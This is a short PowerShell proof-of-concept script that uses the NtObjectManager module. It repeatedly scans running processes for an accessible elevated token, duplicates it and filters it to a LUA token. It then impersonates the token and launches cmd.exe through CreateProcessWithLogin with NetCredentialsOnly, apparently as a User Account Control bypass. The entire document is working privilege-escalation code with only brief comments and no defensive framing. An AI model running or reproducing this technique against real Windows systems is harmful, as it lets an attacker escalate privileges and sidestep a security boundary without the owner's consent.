Import-Module NtObjectManager
#Install-Module NtObjectManager
# Function to find the first accessible elevated token.
function Get-ElevatedToken {
  Param([switch]$NoFilter)
  $token = $null
  while ($true) {
    Write-Host "Checking for elevated processes"
    $token = Use-NtObject($ps = Get-NtProcess) {  
      foreach($p in $ps) {
        try {
            $ret = Use-NtObject($token = Get-NtToken -Primary `
                                        -Process $p -Duplicate `
                                        -IntegrityLevel Medium) {
              if ($token.Elevated) {
                Write-Host "Found elevated token in process $p - Pid $($p.ProcessId)"
                return $token.Duplicate()
              }
            }
            if ($ret -ne $null) {
                return $ret
            }
        } catch {
        }
      }
    }
    if ($token -ne $null) {
      break
    }
    Start-Sleep -Seconds 1
  }

  if (!$NoFilter) {
    # Filter to remove elevated groups/privileges.
    $token = Use-NtObject($token) {
      Get-NtFilteredToken $token -Flags LuaToken
    }
  }
  return $token
}

Use-NtObject($lua_token = Get-ElevatedToken) {
   Use-NtObject($lua_token.Impersonate()) {
   [SandboxAnalysisUtils.Win32Process]::CreateProcessWithLogin("Badger", "Badger", "Badger", 
        "NetCredentialsOnly", "cmd.exe", "cmd.exe", 0, "WinSta0\Default")
   }
}
